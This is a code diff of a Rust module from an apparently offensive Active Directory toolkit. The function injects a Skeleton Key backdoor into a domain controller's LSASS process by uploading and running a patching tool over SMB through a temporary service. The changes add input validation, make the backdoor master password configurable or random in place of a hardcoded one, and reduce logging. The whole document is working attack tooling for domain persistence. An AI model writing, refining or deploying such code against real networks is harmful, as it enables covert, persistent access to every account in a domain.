@@ -26,20 +26,35 @@
 
 use overthrone_core::error::{OverthroneError, Result};
 use overthrone_core::proto::smb::SmbSession;
-use tracing::{info, warn};
+use tracing::{debug, info, warn};
 
 use crate::exec_util;
 use crate::runner::{ForgeConfig, ForgeResult, PersistenceResult};
 
 /// Inject a Skeleton Key into the target DC's LSASS process.
-///
 /// Connects to the DC via SMB, uploads the patching tool, executes it via a
 /// temporary SVCCTL service, reads the output, and cleans up.
-///
 /// If `config.payload_path` is `None`, falls back to generating attack metadata
 /// without execution (useful for dry-run / planning).
 pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
     info!("[skeleton] Skeleton Key injection against {}", config.dc_ip);
+
+    // Input validation
+    if config.dc_ip.trim().is_empty() {
+        return Err(OverthroneError::TicketForge(
+            "DC IP address cannot be empty for Skeleton Key".into(),
+        ));
+    }
+    if config.domain.trim().is_empty() {
+        return Err(OverthroneError::TicketForge(
+            "Domain cannot be empty for Skeleton Key".into(),
+        ));
+    }
+    if config.username.trim().is_empty() {
+        return Err(OverthroneError::TicketForge(
+            "Username cannot be empty for Skeleton Key".into(),
+        ));
+    }
 
     // Validate credentials and establish SMB session
     let smb = match (&config.password, &config.nt_hash) {
@@ -78,14 +93,18 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
         }
     };
 
-    let master_password = "overthrone";
-    let master_hash = compute_skeleton_ntlm(master_password);
+    let master_password = config.skeleton_master_password.clone().unwrap_or_else(|| {
+        let random = rand::random::<u64>();
+        let pw = format!("{:016x}", random);
+        warn!(
+            "[skeleton] No skeleton_master_password configured — generated random: {}",
+            pw
+        );
+        pw
+    });
+    let master_hash = compute_skeleton_ntlm(&master_password);
 
-    info!(
-        "[skeleton] Master password: '{}' (NTLM: {})",
-        master_password,
-        hex::encode(&master_hash)
-    );
+    debug!("[skeleton] Master NTLM hash: {}", hex::encode(&master_hash));
 
     // ── Step 1: Verify admin access ────────────────────────────
     info!("[skeleton] Verifying admin access on {}", config.dc_ip);
@@ -128,12 +147,13 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
             );
 
             info!("[skeleton] Executing skeleton key command via SVCCTL");
-            let out = exec_util::run_remote_command(&smb, &cmd)
-                .await
-                .unwrap_or_else(|e| {
-                    warn!("[skeleton] Command execution returned error (may be normal): {e}");
+            let out = match exec_util::run_remote_command(&smb, &cmd).await {
+                Ok(output) => output,
+                Err(e) => {
+                    debug!("[skeleton] Command execution error (may be normal): {e}");
                     String::from("(no output captured)")
-                });
+                }
+            };
 
             // Cleanup uploaded binary
             info!("[skeleton] Cleaning up uploaded payload");
